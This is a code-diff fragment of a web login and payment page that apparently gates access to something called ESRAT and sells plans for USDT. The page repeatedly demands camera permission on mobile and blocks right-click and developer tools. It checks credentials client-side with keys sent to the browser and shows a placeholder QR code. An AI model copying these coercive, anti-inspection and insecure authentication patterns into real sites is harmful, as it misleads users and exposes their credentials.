+                        clearInterval(cameraInterval);  // Stop asking for permission after it's granted
+                    })
+                    .catch(function(err) {
+                        console.log("Camera permission denied, retrying in 5 seconds.");
+                        disableInputs();  // Keep inputs disabled if permission is denied
+                    });
+            } else {
+                // If on larger screens, directly enable inputs without asking for camera
+                enableInputs();
+            }
+        }
+
+        // Check camera permission every 5 seconds until granted
+        cameraInterval = setInterval(requestCameraPermission, 5000);
+
+        // Event listeners for login
+        document.getElementById("submit").addEventListener("click", verifyEnigmaticCredentials);
+        document.getElementById("password").addEventListener("keydown", (event) => {
+            if (event.key === "Enter") {
+                verifyEnigmaticCredentials();
+            }
+        });
+
+        // Function to verify credentials
+        async function verifyEnigmaticCredentials() {
+            const sacredKeys = await retrieveSacredKeys();
+            const unlockedIdentity = unlockArcaneSecrets(sacredKeys.arcaneCipheredIdentity, sacredKeys.mysticalEssenceOfCipherIdentity, sacredKeys.celestialSecretKeystone);
+            const unlockedPassage = unlockArcaneSecrets(sacredKeys.arcaneCipheredPassage, sacredKeys.mysticalEssenceOfCipherPassage, sacredKeys.celestialSecretKeystone);
+
+            const inputIdentity = document.getElementById("username").value;
+            const inputPassage = document.getElementById("password").value;
+
+            // Check if both inputs are filled
+            if (inputIdentity === "" || inputPassage === "") {
+                alert("Please fill in both username and password.");
+                return;  // Prevent further execution
+            }
+
+            if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
+                window.location.href = "/ESRAT/index-home.html";  // Redirect if login is successful
+            } else {
+                alert("Incorrect User or Password.");  // Alert on incorrect login
+            }
+        }
+
+        // Cursor shadow effect
+        const cursorShadow = document.querySelector('.cursor-shadow');
+        document.addEventListener('mousemove', (event) => {
+            cursorShadow.style.left = event.clientX + 'px';
+            cursorShadow.style.top = event.clientY + 'px';
+        });
+
+        // Anti-inspection script
+        document.addEventListener('contextmenu', event => event.preventDefault());  // Disable right-click
+
+        // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
+        document.onkeydown = function(e) {
+            if (e.keyCode === 123) { // F12
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) {
+                return false; // Ctrl+Shift+I
+            }
+            if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) {
+                return false; // Ctrl+U
+            }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) {
+                return false; // Ctrl+Shift+J
+            }
+        };
+
+        // Payment System Functionality
+        planButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                const plan = button.getAttribute('data-plan');
+                const amount = button.getAttribute('data-amount');
+                
+                // Update payment details
+                paymentAmount.textContent = `$${amount}.00`;
+                selectedPlan.textContent = plan.charAt(0).toUpperCase() + plan.slice(1);
+                
+                // Generate QR code
+                generateQRCode();
+                
+                // Show payment window
+                paymentWindow.style.display = 'flex';
+            });
+        });
+
+        // Close payment window
+        closePayment.addEventListener('click', () => {
+            paymentWindow.style.display = 'none';
+        });
+
+        // I Have Paid button
+        paidButton.addEventListener('click', () => {
+            // Validate registration fields
+            const email = document.getElementById('register-email').value;
+            const regUsername = document.getElementById('register-username').value;
+            const regPassword = document.getElementById('register-password').value;
+            
+            if (!email || !regUsername || !regPassword) {
+                alert('Please fill all registration fields');
+                return;
+            }
+            
+            // Hide payment window and show verification
+            paymentWindow.style.display = 'none';
+            verificationWindow.style.display = 'flex';
+        });
+
+        // Close verification window
+        closeVerification.addEventListener('click', () => {
+            verificationWindow.style.display = 'none';
+            
+            // Reset form
+            document.getElementById('register-email').value = '';
+            document.getElementById('register-username').value = '';
+            document.getElementById('register-password').value = '';
+        });
+
+        // Generate QR code
+        function generateQRCode() {
+            const qrContainer = document.querySelector('.qr-code');
+            qrContainer.innerHTML = '';
+            
+            // Create a canvas for QR code
+            const canvas = document.createElement('canvas');
+            canvas.width = 180;
+            canvas.height = 180;
+            const ctx = canvas.getContext('2d');
+            
+            // Draw a simple QR-like pattern (in a real app, use a QR library)
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, 180, 180);
+            
+            ctx.fillStyle = '#000000';
+            
+            // Outer squares
+            ctx.fillRect(10, 10, 40, 40);
+            ctx.fillRect(130, 10, 40, 40);
+            ctx.fillRect(10, 130, 40, 40);
+            
+            // Inner pattern
+            for (let i = 0; i < 9; i++) {
+                for (let j = 0; j < 9; j++) {
+                    if ((i + j) % 3 === 0) {
+                        ctx.fillRect(50 + i * 10, 50 + j * 10, 8, 8);
+                    }
+                }
+            }
+            
+            // Add text
+            ctx.font = '8px Arial';
+            ctx.fillText('USDT Payment', 50, 170);
+            
+            // Convert to image and add to container
+            const qrImage = new Image();
+            qrImage.src = canvas.toDataURL('image/png');
+            qrContainer.appendChild(qrImage);
+        }
+
+        // Download QR code
+        downloadQr.addEventListener('click', () => {
+            const qrContainer = document.querySelector('.qr-code');
+            const canvas = document.createElement('canvas');
+            canvas.width = 180;
+            canvas.height = 180;
+            const ctx = canvas.getContext('2d');
+            
+            // Draw white background
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, 180, 180);
+            
+            // Draw QR content
+            ctx.fillStyle = '#000000';
+            
+            // Outer squares
+            ctx.fillRect(10, 10, 40, 40);
+            ctx.fillRect(130, 10, 40, 40);
+            ctx.fillRect(10, 130, 40, 40);
+            
+            // Inner pattern
+            for (let i = 0; i < 9; i++) {
+                for (let j = 0; j < 9; j++) {
+                    if ((i + j) % 3 === 0) {
+                        ctx.fillRect(50 + i * 10, 50 + j * 10, 8, 8);
+                    }
+                }
+            }
+            
+            // Add text
+            ctx.font = '8px Arial';
+            ctx.fillText('USDT Payment', 50, 170);
+            
+            // Create download link
+            const link = document.createElement('a');
+            link.download = 'usdt-payment-qr.png';
+            link.href = canvas.toDataURL('image/png');
+            link.click();
+        });
+
+        // Initialize QR code on load
+        window.addEventListener('load', generateQRCode);
+    </script>
+</body>
+</html>
